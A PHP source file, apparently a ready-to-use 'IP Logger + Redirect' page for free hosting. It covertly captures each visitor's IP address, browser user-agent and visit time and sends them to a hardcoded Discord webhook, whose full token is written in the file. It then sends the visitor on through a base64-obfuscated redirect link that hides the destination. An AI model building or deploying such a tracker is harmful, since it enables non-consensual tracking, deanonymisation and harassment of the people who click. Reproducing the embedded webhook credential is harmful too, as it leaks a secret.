<?php
// ============================================
// IP Logger + Redirect Website (Fixed for InfinityFree)
// ============================================

$webhookurl = "https://discord.com/api/webhooks/1519202084694523998/tj35DK1P3-CF1zcY6WW7MIJS0iOMEG4eUARFFXugz6FbiuD_82kSSJRG1ex-Md5n7evK";

$config = [
    'default_redirect' => 'https://discord.gg/fMbZNhGVmh', 
    'require_param' => 'url',                     
    'obfuscate' => true                           
];

function logVisitor($webhookurl) {
    // InfinityFree menggunakan reverse proxy, ambil IP asli pengunjung lewat HTTP_X_FORWARDED_FOR
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        $ip = !empty($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];
    }
    
    $browser = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown Browser';
    
    // Matikan pemblokir bot ketat saat uji coba agar tidak memblokir diri sendiri
    if(preg_match('/bot|robot|spider|crawler/i', $browser)) {
        return false;
    }
    
    $TheirDate = date('d/m/Y');
    $TheirTime = date('G:i:s');
    
    // JANGAN gunakan ip-api.com / geoiplookup di InfinityFree karena diblokir hosting gratis!
    // Kita kirim IP mentah & Browser User-Agent secara langsung.
    $data = "**🎯 New Click Detected!**\n" .
            "**IP Address:** `$ip`\n" .
            "**Date:** $TheirDate\n" .
            "**Time:** $TheirTime\n" .
            "**Browser Info:** `$browser`";
    
    $json_data = [
        'content' => $data,
        'username' => "Logger Server Bot"
    ];
    
    $ch = curl_init($webhookurl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json_data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    // Tambahkan timeout agar eksekusi script tidak menggantung jika Discord sibuk
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); 
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    
    curl_exec($ch);
    curl_close($ch);
    
    return true;
}

// Handling Redirect
$target = isset($_GET[$config['require_param']]) ? $_GET[$config['require_param']] : null;

if ($target && $config['obfuscate']) {
    $decoded = base64_decode($target, true);
    if ($decoded !== false) {
        $target = $decoded;
    }
}

if (!$target || !filter_var($target, FILTER_VALIDATE_URL)) {
    $target = $config['default_redirect'];
}

// Jalankan pencatatan log
logVisitor($webhookurl);

// Alihkan halaman ke target
header("Location: " . $target, true, 302);
exit();
?>
